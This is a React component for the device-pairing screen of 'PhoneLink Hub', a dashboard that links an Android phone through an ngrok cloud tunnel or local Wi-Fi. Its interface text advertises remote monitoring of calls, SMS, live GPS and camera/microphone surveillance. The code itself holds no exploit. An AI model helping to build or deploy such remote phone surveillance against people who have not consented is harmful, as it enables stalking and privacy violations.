import { useState, useEffect } from 'react';
import {
  Globe,
  Radio,
  ExternalLink,
  Copy,
  Check,
  Smartphone,
  Wifi,
  Zap,
  ArrowRight,
  ShieldCheck,
  RefreshCw,
  QrCode,
  AlertTriangle
} from 'lucide-react';

export default function DevicePairingHub({ onOpenTunnelModal }) {
  const [tunnelState, setTunnelState] = useState({ active: false, url: null, error: null });
  const [tunnelConfig, setTunnelConfig] = useState({ authtoken: '', domain: '', autoStart: false });
  const [serverInfo, setServerInfo] = useState({ localIp: '127.0.0.1', port: 5000, localUrl: '' });
  const [loading, setLoading] = useState(false);
  const [copiedTunnel, setCopiedTunnel] = useState(false);
  const [copiedLocal, setCopiedLocal] = useState(false);

  const fetchStatus = async () => {
    try {
      const res = await fetch('/api/server-info');
      const data = await res.json();
      if (data.localIp) setServerInfo(data);
      if (data.tunnel) setTunnelState(data.tunnel);
      if (data.tunnelConfig) setTunnelConfig(data.tunnelConfig);
    } catch (_) {
      try {
        const res2 = await fetch('/api/tunnel');
        const data2 = await res2.json();
        if (data2.status) setTunnelState(data2.status);
        if (data2.config) setTunnelConfig(data2.config);
      } catch (_) {}
    }
  };

  useEffect(() => {
    fetchStatus();
    const interval = setInterval(fetchStatus, 3000);
    return () => clearInterval(interval);
  }, []);

  const handleQuickStartTunnel = async () => {
    if (!tunnelConfig.authtoken || !tunnelConfig.authtoken.trim()) {
      if (onOpenTunnelModal) onOpenTunnelModal();
      return;
    }
    setLoading(true);
    try {
      const res = await fetch('/api/tunnel/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(tunnelConfig)
      });
      const data = await res.json();
      if (data.success) {
        setTunnelState(data.status);
      } else {
        alert(data.error || 'Failed to start cloud tunnel');
      }
    } catch (e) {
      alert('Network error connecting to tunnel service');
    } finally {
      setLoading(false);
    }
  };

  const localAddress = serverInfo.localUrl || `http://${serverInfo.localIp}:${serverInfo.port}`;

  return (
    <div className="max-w-4xl mx-auto py-6 px-4 space-y-6 animate-pop">
      
      {/* Hero Welcome Banner */}
      <div className="relative rounded-3xl p-6 sm:p-8 bg-gradient-to-br from-indigo-900/30 via-slate-900/80 to-slate-950 border border-indigo-500/30 text-white shadow-2xl overflow-hidden">
        <div className="pointer-events-none absolute -right-16 -bottom-16 h-64 w-64 rounded-full bg-indigo-500/15 blur-3xl" />
        <div className="pointer-events-none absolute -left-16 -top-16 h-64 w-64 rounded-full bg-emerald-500/10 blur-3xl" />

        <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
          <div className="space-y-2 max-w-xl">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-bold bg-indigo-500/20 border border-indigo-500/40 text-indigo-300">
              <Smartphone className="h-3.5 w-3.5 text-indigo-400 animate-pulse" />
              <span>Step 1: Link Your Android Phone</span>
            </div>
            <h2 className="text-xl sm:text-2xl font-black tracking-tight text-white">
              No Devices Connected Yet
            </h2>
            <p className="text-xs sm:text-sm text-slate-300 leading-relaxed">
              PhoneLink Hub is running locally on this computer. To monitor calls, read SMS, track live GPS, and access camera/microphone surveillance, connect your phone using either method below.
            </p>
          </div>

          <div className="shrink-0 flex flex-col items-center gap-2">
            <button
              type="button"
              onClick={onOpenTunnelModal}
              className="px-5 py-3 rounded-2xl font-bold text-xs sm:text-sm bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 shadow-xl shadow-emerald-500/25 flex items-center gap-2 cursor-pointer transition-all transform hover:-translate-y-0.5"
            >
              <Globe className="h-4 w-4" />
              <span>Configure Cloud Tunnel</span>
            </button>
            <span className="text-[11px] text-slate-400">Connects from anywhere (4G / 5G)</span>
          </div>
        </div>
      </div>

      {/* Two Connection Methods Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
        
        {/* Method 1: ngrok Cloud Tunnel (Worldwide 4G/5G) */}
        <div className="relative rounded-3xl p-6 bg-slate-900/70 border border-emerald-500/40 hover:border-emerald-500/70 shadow-xl flex flex-col justify-between transition-all space-y-4">
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <div className="p-2.5 rounded-2xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                  <Globe className="h-5 w-5" />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-white">Method A: Worldwide Cloud Tunnel</h3>
                  <p className="text-[11px] text-slate-400">Out-of-network 4G / 5G / Remote Wi-Fi</p>
                </div>
              </div>

              <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold border ${
                tunnelState?.active
                  ? 'bg-emerald-500/20 border-emerald-500/50 text-emerald-300'
                  : 'bg-slate-800 border-slate-700 text-slate-400'
              }`}>
                {tunnelState?.active ? 'ONLINE 🌐' : 'STOPPED'}
              </span>
            </div>

            <p className="text-xs text-slate-300 leading-relaxed">
              Phone chahe ghar ke bahar ho, school me ho, ya mobile data par ho — ngrok cloud tunnel se PC par live connect rehta hai.
            </p>

            {/* If Tunnel Active: Show Live URL with Copy Button */}
            {tunnelState?.active && tunnelState?.url ? (
              <div className="p-3.5 rounded-2xl bg-slate-950 border border-emerald-500/30 space-y-2">
                <div className="flex items-center justify-between text-[11px] text-emerald-400 font-bold">
                  <span className="flex items-center gap-1.5">
                    <Radio className="h-3 w-3 animate-pulse" />
                    Your Public Cloud Address
                  </span>
                  <span className="text-[10px] text-slate-400">Paste in Phone</span>
                </div>
                <div className="flex items-center gap-2">
                  <code className="text-xs font-mono text-cyan-300 flex-1 truncate select-all">
                    {tunnelState.url}
                  </code>
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText(tunnelState.url);
                      setCopiedTunnel(true);
                      setTimeout(() => setCopiedTunnel(false), 2000);
                    }}
                    className="px-3 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs transition-colors flex items-center gap-1 cursor-pointer shrink-0"
                  >
                    {copiedTunnel ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                    <span>{copiedTunnel ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
              </div>
            ) : (
              /* If Inactive: Show Quick Start Button */
              <div className="p-3.5 rounded-2xl bg-slate-950/80 border border-slate-800 space-y-2 text-xs">
                <p className="text-[11px] text-slate-400">
                  {tunnelConfig.authtoken ? 'AuthToken is configured. Click below to activate:' : 'Enter your free ngrok token to start the public tunnel.'}
                </p>
                <button
                  type="button"
                  onClick={tunnelConfig.authtoken ? handleQuickStartTunnel : onOpenTunnelModal}
                  disabled={loading}
                  className="w-full py-2.5 rounded-xl font-bold text-xs bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white shadow-md shadow-emerald-500/20 flex items-center justify-center gap-2 cursor-pointer transition-all"
                >
                  {loading ? <RefreshCw className="h-4 w-4 animate-spin" /> : <Zap className="h-4 w-4 text-amber-300" />}
                  <span>{tunnelConfig.authtoken ? 'Start Cloud Tunnel Now' : 'Enter ngrok Token & Start'}</span>
                </button>
              </div>
            )}
          </div>

          <div className="pt-2 text-[11px] text-slate-400 flex items-center justify-between border-t border-slate-800/80">
            <span>Powered by embedded ngrok SDK</span>
            <button
              type="button"
              onClick={onOpenTunnelModal}
              className="text-emerald-400 hover:underline cursor-pointer font-semibold"
            >
              Edit Settings →
            </button>
          </div>
        </div>

        {/* Method 2: Same Wi-Fi Network */}
        <div className="relative rounded-3xl p-6 bg-slate-900/70 border border-indigo-500/30 hover:border-indigo-500/60 shadow-xl flex flex-col justify-between transition-all space-y-4">
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <div className="p-2.5 rounded-2xl bg-indigo-500/20 text-indigo-400 border border-indigo-500/30">
                  <Wifi className="h-5 w-5" />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-white">Method B: Same Home Wi-Fi</h3>
                  <p className="text-[11px] text-slate-400">Direct Local Network Connection</p>
                </div>
              </div>

              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold border border-indigo-500/40 bg-indigo-500/10 text-indigo-300">
                LOCAL ONLY
              </span>
            </div>

            <p className="text-xs text-slate-300 leading-relaxed">
              Agar aapka phone aur computer dono ek hi Wi-Fi router se jude hain, to bina kisi internet tunnel ke direct is local address se connect kar sakte hain:
            </p>

            <div className="p-3.5 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
              <div className="flex items-center justify-between text-[11px] text-indigo-400 font-bold">
                <span>Local Server Address</span>
                <span className="text-[10px] text-slate-400">Port {serverInfo.port}</span>
              </div>
              <div className="flex items-center gap-2">
                <code className="text-xs font-mono text-cyan-300 flex-1 truncate select-all">
                  {localAddress}
                </code>
                <button
                  type="button"
                  onClick={() => {
                    navigator.clipboard.writeText(localAddress);
                    setCopiedLocal(true);
                    setTimeout(() => setCopiedLocal(false), 2000);
                  }}
                  className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-xs transition-colors flex items-center gap-1 cursor-pointer shrink-0"
                >
                  {copiedLocal ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                  <span>{copiedLocal ? 'Copied' : 'Copy'}</span>
                </button>
              </div>
            </div>
          </div>

          <div className="pt-2 text-[11px] text-slate-400 flex items-center justify-between border-t border-slate-800/80">
            <span>Fastest P2P latency (&lt;2ms)</span>
            <span className="text-slate-500">Requires same router</span>
          </div>
        </div>

      </div>

      {/* 3 Step Instructions */}
      <div className="p-5 rounded-2xl bg-slate-900/40 border border-slate-800/80 space-y-3">
        <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-2">
          <ShieldCheck className="h-4 w-4 text-emerald-400" />
          Quick 30-Second Setup Guide
        </h4>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs text-slate-300">
          <div className="p-3 rounded-xl bg-slate-950/60 border border-slate-800/80 space-y-1">
            <span className="font-bold text-indigo-400 block">1. Open PhoneLink App</span>
            <p className="text-[11px] text-slate-400">Apne Android phone me PhoneLink Hub app ko open karein.</p>
          </div>
          <div className="p-3 rounded-xl bg-slate-950/60 border border-slate-800/80 space-y-1">
            <span className="font-bold text-emerald-400 block">2. Paste URL Address</span>
            <p className="text-[11px] text-slate-400">Server URL box me upar se copy kiya hua URL daalein (Cloud URL ya Local Wi-Fi).</p>
          </div>
          <div className="p-3 rounded-xl bg-slate-950/60 border border-slate-800/80 space-y-1">
            <span className="font-bold text-cyan-400 block">3. Tap Connect</span>
            <p className="text-[11px] text-slate-400">Connect button dabate hi phone is screen par live show hone lagega!</p>
          </div>
        </div>
      </div>

    </div>
  );
}

